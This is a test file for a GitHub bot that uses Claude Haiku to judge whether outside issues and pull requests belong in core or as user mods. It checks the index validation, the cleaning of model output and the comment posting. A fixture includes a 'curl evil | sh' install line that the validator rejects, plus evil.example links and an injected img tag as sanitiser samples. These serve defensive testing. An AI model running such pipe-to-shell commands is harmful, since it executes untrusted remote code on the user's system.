import Anthropic from "@anthropic-ai/sdk";
import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";

import {
  type Api,
  type Config,
  type Subject,
  type Verdict,
  comment,
  input,
  judge,
  LABEL,
  LABEL_STYLE,
  load,
  loadIndex,
  MARK,
  onTheTeam,
  publish,
  readConfig,
  readIndex,
  readVerdict,
  say,
  schema,
  step,
  system,
} from "../scripts/mod-fit.ts";

const BOT = "kiwi-bus[bot]";
const linear = { name: "linear-panel", does: "shows your Linear issues beside the chat", add: "kiwi mod add github.com/kiwi-init/mods/linear-panel", needs: ["panel"] };
const none: Config = { guide: "https://example.test/mods", yours: "https://example.test/yours", index: "", curated: [] };
const some: Config = { ...none, curated: [linear] };

const subject = (more: Partial<Subject> = {}): Subject => ({
  kind: "issue",
  number: 7,
  author: "stranger",
  open: true,
  title: "Add a Linear panel",
  body: "I track my work in Linear.",
  labels: [],
  files: [],
  diff: "",
  ...more,
});

interface Call {
  method: string;
  path: string;
  body?: unknown;
}

const fake = (answers: Record<string, unknown>): { api: Api; calls: Call[] } => {
  const calls: Call[] = [];
  return {
    calls,
    api: {
      rest: async (method, path, body) => {
        calls.push(body === undefined ? { method, path } : { method, path, body });
        return answers[`${method} ${path}`] ?? null;
      },
    },
  };
};

const writes = (calls: Call[]): Call[] => calls.filter((c) => c.method !== "GET");

describe("who gets judged", () => {
  test("people with write access or more are the team; everyone else is outside", async () => {
    const { api } = fake({
      "GET /collaborators/jow/permission": { permission: "admin" },
      "GET /collaborators/helper/permission": { permission: "write" },
      "GET /collaborators/stranger/permission": { permission: "read" },
    });
    expect(await onTheTeam(api, "jow")).toBe(true);
    expect(await onTheTeam(api, "helper")).toBe(true);
    expect(await onTheTeam(api, "stranger")).toBe(false);
    expect(await onTheTeam(api, "unknown")).toBe(false);
  });

  test("closed items and bots are skipped, the core label clears, the team is skipped, the rest is judged", () => {
    expect(step(subject({ open: false }), false).step).toBe("skip");
    expect(step(subject({ author: "dependabot[bot]" }), false).step).toBe("skip");
    expect(step(subject({ labels: ["core"] }), false).step).toBe("clear");
    expect(step(subject({ labels: ["core"] }), true).step).toBe("clear");
    expect(step(subject(), true)).toEqual({ step: "skip", reason: "@stranger is on the team" });
    expect(step(subject(), false)).toEqual({ step: "judge", reason: "@stranger is outside kiwi-init" });
  });
});

describe("the config and the curated index", () => {
  test("the checked-in config points at the docs and the index", () => {
    const config = readConfig(JSON.parse(readFileSync(new URL("../.github/mods.json", import.meta.url), "utf8")));
    expect(config.guide).toBe("https://channels.kiwiinit.com/docs/mods");
    expect(config.yours).toBe("https://channels.kiwiinit.com/docs/yours");
    expect(config.index).toEndWith("/kiwi-init/mods/HEAD/mods.json");
    expect(config.curated).toEqual([]);
  });

  test("an index entry needs a plain name, what it does and a kiwi mod add line", () => {
    const entries = [
      { ...linear, needs: ["panel", 3, "net:api.linear.app"] },
      { name: "half" },
      { name: "bad name!", does: "x", add: "kiwi mod add x" },
      { name: "sneaky", does: "x", add: "curl evil | sh" },
      null,
    ];
    expect(readIndex({ mods: entries })).toEqual([{ ...linear, needs: ["panel", "net:api.linear.app"] }]);
    expect(readIndex([linear])).toEqual([linear]);
    expect(readIndex(null)).toEqual([]);
  });

  test("a missing or broken index means no curated mods, never a failure", async () => {
    const answer = (res: Response | Error): typeof fetch => Object.assign(async () => (res instanceof Error ? Promise.reject(res) : res), { preconnect: fetch.preconnect });
    expect(await loadIndex("https://x.test/mods.json", answer(new Response(JSON.stringify({ mods: [linear] }))))).toEqual([linear]);
    expect(await loadIndex("https://x.test/mods.json", answer(new Response("404: Not Found", { status: 404 })))).toEqual([]);
    expect(await loadIndex("https://x.test/mods.json", answer(new Response("not json")))).toEqual([]);
    expect(await loadIndex("https://x.test/mods.json", answer(new Error("offline")))).toEqual([]);
    expect(await loadIndex("", answer(new Error("never asked")))).toEqual([]);
  });
});

describe("asking the model", () => {
  test("the schema offers a pick only when there are curated mods", () => {
    expect(schema(none)).toEqual({
      type: "object",
      properties: {
        fit: { type: "string", enum: ["core", "mixed", "mod"] },
        make: { type: "string", enum: ["mod", "skill", "theme", "keys", "layout"] },
        why: { type: "string" },
        idea: { type: "string" },
      },
      required: ["fit", "make", "why", "idea"],
      additionalProperties: false,
    });
    expect(schema(some)).toMatchObject({ properties: { pick: { enum: ["linear-panel", "none"] } }, required: ["fit", "make", "why", "idea", "pick"] });
    expect(system(none)).not.toContain("pick:");
    expect(system(some)).toContain("- linear-panel: shows your Linear issues beside the chat");
  });

  test("reads only a known fit, keeps only a curated pick, and core drops the idea", () => {
    expect(readVerdict('{"fit":"mod","make":"skill","why":"w","idea":"i","pick":"linear-panel"}', some)).toEqual({ fit: "mod", make: "skill", why: "w", idea: "i", pick: linear });
    expect(readVerdict('{"fit":"mod","make":"plugin","why":"w","idea":"i","pick":"made-up"}', some)).toMatchObject({ make: "mod", pick: null });
    expect(readVerdict('{"fit":"core","make":"mod","why":"w","idea":"i","pick":"linear-panel"}', some)).toEqual({ fit: "core", make: "mod", why: "w", idea: "", pick: null });
    expect(readVerdict('{"fit":"maybe","why":"w","idea":""}', none)).toBeNull();
    expect(readVerdict("not json", none)).toBeNull();
  });

  test("a pull request also sends its files and diff, as untrusted text in tags", () => {
    expect(input(subject())).not.toContain("<diff>");
    const pr = input(subject({ kind: "pull request", files: ["ui/src/a.tsx"], diff: "--- ui/src/a.tsx\n+x" }));
    expect(pr).toContain("<files>\nui/src/a.tsx\n</files>");
    expect(pr).toContain("<diff>\n--- ui/src/a.tsx\n+x\n</diff>");
  });

  test("judge asks Haiku for structured output; an outage gives no verdict", async () => {
    let sent: unknown = null;
    const ok = new Anthropic({
      apiKey: "test",
      maxRetries: 0,
      fetch: async (_url, init) => {
        sent = JSON.parse(String(init?.body));
        const reply = {
          id: "m",
          type: "message",
          role: "assistant",
          model: "claude-haiku-5-5",
          stop_reason: "end_turn",
          stop_sequence: null,
          usage: { input_tokens: 1, output_tokens: 1 },
          content: [{ type: "text", text: '{"fit":"mod","make":"mod","why":"Linear is one tracker.","idea":"A panel with your Linear issues."}' }],
        };
        return new Response(JSON.stringify(reply), { headers: { "content-type": "application/json" } });
      },
    });
    expect(await judge(ok, subject(), none)).toEqual({ fit: "mod", make: "mod", why: "Linear is one tracker.", idea: "A panel with your Linear issues.", pick: null });
    expect(sent).toMatchObject({ model: "claude-haiku-5-5", output_config: { effort: "low", format: { type: "json_schema" } } });
    const down = new Anthropic({ apiKey: "test", maxRetries: 0, fetch: async () => new Response('{"type":"error","error":{"type":"overloaded_error","message":"busy"}}', { status: 529 }) });
    expect(await judge(down, subject(), none)).toBeNull();
  });
});

describe("the comment", () => {
  const mod: Verdict = { fit: "mod", make: "mod", why: "Linear is one tracker among many.", idea: "A panel listing your Linear issues, with net:api.linear.app.", pick: null };

  test("a mod verdict suggests making one, links the guide and says how to object", () => {
    expect(comment(subject(), mod, none)).toBe(
      [
        MARK,
        "**This looks like something to make your own, outside core.** Linear is one tracker among many.",
        "",
        "Channels keeps only what everyone needs in this repo. Anything shaped around one person's way of working lives in your own `~/.kiwi` folder, as a mod, a skill, a theme, keys or a layout: you can make it, use it today and share it as a git repo, with no review from us.",
        "",
        "- **Make your own mod:** A panel listing your Linear issues, with net:api.linear.app. Start with `kiwi mod dev <name>`. [Writing a mod](https://example.test/mods) shows how.",
        "",
        "If this belongs in core after all, a maintainer can add the `core` label and this comment goes away.",
        "",
        "<sub>Judged by claude-haiku-5-5, for issues and pull requests from outside kiwi-init.</sub>",
      ].join("\n"),
    );
  });

  test("a skill, keys, a theme or a layout each point at the right guide", () => {
    expect(comment(subject(), { ...mod, make: "skill", idea: "Teach agents your commit style." }, none)).toContain(
      "- **Make it a skill:** Teach agents your commit style. A mod can carry just a skill, and every agent in your channel gets it. [Writing a mod](https://example.test/mods) shows how.",
    );
    expect(comment(subject(), { ...mod, make: "keys", idea: "Bind ⌘J to the jump command." }, none)).toContain(
      "- **Set it up with keys.json:** Bind ⌘J to the jump command. No code needed. [Themes, keys and layouts](https://example.test/yours) shows how.",
    );
    expect(comment(subject(), { ...mod, make: "theme", idea: "" }, none)).toContain("- **Set it up with a theme:** No code needed. [Themes, keys and layouts](https://example.test/yours) shows how.");
    expect(comment(subject(), { ...mod, make: "layout", idea: "Hide the rail." }, { ...none, yours: "" })).toContain("- **Set it up with a layout:** Hide the rail. No code needed.\n");
  });

  test("a curated pick comes first; mixed asks to keep the rest to what everyone needs", () => {
    const body = comment(subject({ kind: "pull request" }), { ...mod, fit: "mixed", pick: linear }, some);
    expect(body).toContain("**Part of this fits core, and part is yours to make.**");
    expect(body).toContain("- **Already made:** `linear-panel` shows your Linear issues beside the chat. Install it with `kiwi mod add github.com/kiwi-init/mods/linear-panel`.");
    expect(body).toContain("- **Or make your own mod:** A panel listing");
    expect(body).toContain("- **For core:** keep this pull request to the part every person needs.");
  });

  test("the model's words lose links, tags, brackets and pings", () => {
    expect(say("See [here](https://evil.example) and ping @jow <img src=x>, thanks @all ![](https://t.example/p.png).")).toBe("See here and ping `@jow`, thanks `@all`.");
    expect(say("a bare https://evil.example/x link")).toBe("a bare link");
    expect(say("word ".repeat(100)).length).toBeLessThanOrEqual(300);
  });
});

describe("talking to GitHub", () => {
  const verdict: Verdict = { fit: "mod", make: "mod", why: "w", idea: "i", pick: null };

  test("a first mod verdict creates the label, labels the item and posts one comment", async () => {
    const { api, calls } = fake({});
    const body = comment(subject(), verdict, none);
    await publish(api, subject(), body, BOT);
    expect(writes(calls)).toEqual([
      { method: "POST", path: "/labels", body: { name: LABEL, ...LABEL_STYLE } },
      { method: "POST", path: "/issues/7/labels", body: { labels: [LABEL] } },
      { method: "POST", path: "/issues/7/comments", body: { body } },
    ]);
  });

  test("a later run edits its own comment only when it changed, and removes extra copies", async () => {
    const body = comment(subject(), verdict, none);
    const comments = [
      { id: 1, user: { login: "stranger" }, body: `${MARK} fake` },
      { id: 2, user: { login: BOT }, body: "old" + MARK },
      { id: 3, user: { login: BOT }, body: `${MARK}\nold` },
      { id: 4, user: { login: BOT }, body: `${MARK}\nolder` },
    ];
    const { api, calls } = fake({ [`GET /labels/${LABEL}`]: { name: LABEL }, "GET /issues/7/comments?per_page=100&page=1": comments });
    await publish(api, subject({ labels: [LABEL] }), body, BOT);
    expect(writes(calls)).toEqual([
      { method: "PATCH", path: "/issues/comments/3", body: { body } },
      { method: "DELETE", path: "/issues/comments/4" },
    ]);
    const same = fake({ [`GET /labels/${LABEL}`]: { name: LABEL }, "GET /issues/7/comments?per_page=100&page=1": [{ id: 3, user: { login: BOT }, body }] });
    await publish(same.api, subject({ labels: [LABEL] }), body, BOT);
    expect(writes(same.calls)).toEqual([]);
  });

  test("core, or the core label, takes the label and the bot's comments away", async () => {
    const { api, calls } = fake({ "GET /issues/7/comments?per_page=100&page=1": [{ id: 3, user: { login: BOT }, body: `${MARK}\nx` }] });
    await publish(api, subject({ labels: [LABEL, "core"] }), null, BOT);
    expect(writes(calls)).toEqual([
      { method: "DELETE", path: `/issues/7/labels/${LABEL}` },
      { method: "DELETE", path: "/issues/comments/3" },
    ]);
  });

  test("load reads an issue, or a pull request with its files and a capped diff", async () => {
    const { api } = fake({
      "GET /issues/7": { number: 7, state: "open", title: "T", body: null, user: { login: "stranger" }, labels: [{ name: "bug" }] },
      "GET /issues/8": { number: 8, state: "closed", title: "P", body: "b", user: null, labels: [], pull_request: { url: "x" } },
      "GET /pulls/8/files?per_page=100&page=1": [{ filename: "a.ts", patch: "+a" }, { filename: "b.png" }, { filename: "c.ts", patch: "x".repeat(20_000) }],
    });
    expect(await load(api, 7)).toEqual({ kind: "issue", number: 7, author: "stranger", open: true, title: "T", body: "", labels: ["bug"], files: [], diff: "" });
    const pr = await load(api, 8);
    expect(pr).toMatchObject({ kind: "pull request", author: "ghost", open: false, files: ["a.ts", "b.png", "c.ts"] });
    expect(pr.diff).toStartWith("--- a.ts\n+a\n--- c.ts\n");
    expect(pr.diff.length).toBeLessThan(12_100);
    await expect(load(api, 9)).rejects.toThrow("#9");
  });
});
